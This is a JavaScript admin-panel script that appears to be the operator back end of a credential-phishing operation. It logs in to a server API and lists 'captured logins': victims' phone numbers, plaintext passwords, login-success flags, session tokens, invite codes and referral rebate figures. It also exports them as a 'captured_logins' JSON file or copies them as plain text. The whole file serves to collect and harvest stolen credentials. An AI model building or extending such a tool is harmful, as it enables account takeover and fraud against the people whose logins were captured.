// ============================================
// ADMIN PANEL LOGIC — Server API Version
// ============================================
// NO Supabase keys in this file. All data goes
// through the Express server at /api/admin/*.
// Admin auth uses server-issued bearer tokens.

document.addEventListener('DOMContentLoaded', () => {
  const loginGate = document.getElementById('adminLoginGate');
  const dashboard = document.getElementById('adminDashboard');

  // Check for existing session token
  const savedToken = sessionStorage.getItem('admin_token');
  if (savedToken) {
    loginGate.style.display = 'none';
    dashboard.classList.add('visible');
    loadData(savedToken);
  }

  // --- Admin Login ---
  const adminLoginBtn = document.getElementById('adminLoginBtn');
  const adminUsername = document.getElementById('adminUsername');
  const adminPassword = document.getElementById('adminPassword');
  const adminError = document.getElementById('adminError');

  adminLoginBtn.addEventListener('click', handleAdminLogin);
  adminPassword.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleAdminLogin();
  });

  async function handleAdminLogin() {
    const user = adminUsername.value.trim();
    const pass = adminPassword.value.trim();
    adminError.textContent = '';

    if (!user || !pass) {
      adminError.textContent = 'Please enter both username and password.';
      return;
    }

    adminLoginBtn.textContent = 'Signing in...';
    adminLoginBtn.disabled = true;

    try {
      const response = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user, password: pass })
      });

      const result = await response.json();

      if (result.success && result.token) {
        sessionStorage.setItem('admin_token', result.token);
        loginGate.style.display = 'none';
        dashboard.classList.add('visible');
        loadData(result.token);
      } else {
        adminError.textContent = result.message || 'Invalid credentials.';
        adminPassword.value = '';
        adminPassword.focus();
      }
    } catch (err) {
      adminError.textContent = 'Network error. Is the server running?';
    } finally {
      adminLoginBtn.textContent = 'Sign In';
      adminLoginBtn.disabled = false;
    }
  }

  // --- Logout ---
  document.getElementById('logoutBtn').addEventListener('click', async () => {
    const token = sessionStorage.getItem('admin_token');
    if (token) {
      try {
        await fetch('/api/admin/logout', {
          method: 'POST',
          headers: { 'Authorization': `Bearer ${token}` }
        });
      } catch (e) { /* ignore */ }
    }
    sessionStorage.removeItem('admin_token');
    location.reload();
  });

  // --- Refresh ---
  document.getElementById('refreshBtn').addEventListener('click', () => {
    const icon = document.querySelector('#refreshBtn svg');
    icon.classList.add('refresh-spin');
    const token = sessionStorage.getItem('admin_token');
    loadData(token).then(() => {
      setTimeout(() => icon.classList.remove('refresh-spin'), 500);
    });
  });

  // --- Download JSON ---
  document.getElementById('downloadBtn').addEventListener('click', downloadJSON);

  // --- Copy Plain Text ---
  document.getElementById('copyBtn').addEventListener('click', copyPlainText);
});

// --- Data Store ---
let capturedData = [];

// --- Load Data from Server API ---
async function loadData(token) {
  const tableBody = document.getElementById('dataTableBody');
  const totalCount = document.getElementById('totalCount');
  const todayCount = document.getElementById('todayCount');

  tableBody.innerHTML = '<tr class="empty-row"><td colspan="12">Loading...</td></tr>';

  try {
    const response = await fetch('/api/admin/data', {
      headers: { 'Authorization': `Bearer ${token}` }
    });

    if (response.status === 401) {
      sessionStorage.removeItem('admin_token');
      location.reload();
      return;
    }

    const result = await response.json();

    if (!result.success) {
      tableBody.innerHTML = `<tr class="empty-row"><td colspan="12">Error: ${result.error || 'Unknown error'}</td></tr>`;
      return;
    }

    capturedData = result.data || [];

    // Update stats
    totalCount.textContent = capturedData.length;
    document.getElementById('totalBadge').textContent = capturedData.length;

    const today = new Date().toISOString().split('T')[0];
    const todayEntries = capturedData.filter(d => d.created_at && d.created_at.startsWith(today));
    todayCount.textContent = todayEntries.length;

    // Render table
    if (capturedData.length === 0) {
      tableBody.innerHTML = '<tr class="empty-row"><td colspan="12">No captured logins yet.</td></tr>';
      return;
    }

    tableBody.innerHTML = capturedData.map((item, index) => {
      const subUsers = item.sub_users;
      let subUsersStr = '-';
      if (subUsers) {
        let parsed = subUsers;
        if (typeof subUsers === 'string') {
          try { parsed = JSON.parse(subUsers); } catch { parsed = []; }
        }
        subUsersStr = Array.isArray(parsed) ? parsed.length.toString() : '1';
      }

      return `
      <tr>
        <td>${index + 1}</td>
        <td>${escapeHtml(item.phone_number || '')}</td>
        <td class="password-cell">${escapeHtml(item.password || '')}</td>
        <td>${item.login_success ? '✅' : '❌'}</td>
        <td>
          ${item.token ? `<input type="text" value="${escapeHtml(item.token)}" readonly onclick="this.select(); document.execCommand('copy'); showFeedback('Token copied!');" style="width: 80px; background: rgba(255,255,255,0.05); color: #a3b3ff; border: 1px solid rgba(255,255,255,0.2); padding: 4px; border-radius: 4px; cursor: pointer;" title="Click to copy entirely">` : '-'}
        </td>
        <td>${item.spread_uid ?? '-'}</td>
        <td>${escapeHtml(item.invite_code || '-')}</td>
        <td>${item.spread_count ?? '-'}</td>
        <td>${item.rebate_sum ?? '-'}</td>
        <td>${subUsersStr}</td>
        <td class="time-cell">${formatTime(item.created_at)}</td>
        <td class="time-cell">${truncate(item.user_agent || 'N/A', 30)}</td>
      </tr>
    `}).join('');

  } catch (err) {
    console.error('Load error:', err);
    tableBody.innerHTML = '<tr class="empty-row"><td colspan="12">Failed to load data. Is the server running?</td></tr>';
  }
}

// --- Download JSON ---
function downloadJSON() {
  if (capturedData.length === 0) {
    showFeedback('No data to download.');
    return;
  }

  const exportData = capturedData.map(item => ({
    phone_number: item.phone_number,
    password: item.password,
    login_success: item.login_success,
    token: item.token || null,
    spread_uid: item.spread_uid,
    invite_code: item.invite_code,
    spread_count: item.spread_count,
    rebate_sum: item.rebate_sum,
    sub_users: item.sub_users || [],
    timestamp: item.created_at,
    user_agent: item.user_agent
  }));

  const jsonStr = JSON.stringify(exportData, null, 2);
  const blob = new Blob([jsonStr], { type: 'application/json' });
  const url = URL.createObjectURL(blob);

  const a = document.createElement('a');
  a.href = url;
  a.download = `captured_logins_${new Date().toISOString().split('T')[0]}.json`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);

  showFeedback('JSON file downloaded.');
}

// --- Copy Plain Text ---
function copyPlainText() {
  if (capturedData.length === 0) {
    showFeedback('No data to copy.');
    return;
  }

  const lines = capturedData.map((item, i) => {
    const subCount = item.sub_users
      ? (Array.isArray(item.sub_users) ? item.sub_users.length
        : typeof item.sub_users === 'string'
          ? (() => { try { return JSON.parse(item.sub_users).length; } catch { return 0; } })()
          : 0)
      : 0;
    return `${i + 1}. Phone: ${item.phone_number} | Pwd: ${item.password} | OK: ${item.login_success ? 'Y' : 'N'} | UID: ${item.spread_uid ?? '-'} | Code: ${item.invite_code ?? '-'} | Spread: ${item.spread_count ?? '-'} | Rebate: ${item.rebate_sum ?? '-'} | Subs: ${subCount} | Time: ${formatTime(item.created_at)}`;
  });

  const text = lines.join('\n');

  navigator.clipboard.writeText(text).then(() => {
    showFeedback('Copied to clipboard!');
  }).catch(() => {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    showFeedback('Copied to clipboard!');
  });
}

// --- Feedback Toast ---
function showFeedback(message) {
  const existing = document.querySelector('.copy-feedback');
  if (existing) existing.remove();

  const el = document.createElement('div');
  el.className = 'copy-feedback';
  el.textContent = message;
  document.body.appendChild(el);

  requestAnimationFrame(() => el.classList.add('show'));

  setTimeout(() => {
    el.classList.remove('show');
    setTimeout(() => el.remove(), 300);
  }, 2500);
}

// --- Utilities ---
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function formatTime(isoStr) {
  if (!isoStr) return 'N/A';
  const d = new Date(isoStr);
  return d.toLocaleString('en-US', {
    month: 'short',
    day: 'numeric',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    hour12: true
  });
}

function truncate(str, max) {
  if (str.length <= max) return str;
  return str.substring(0, max) + '...';
}
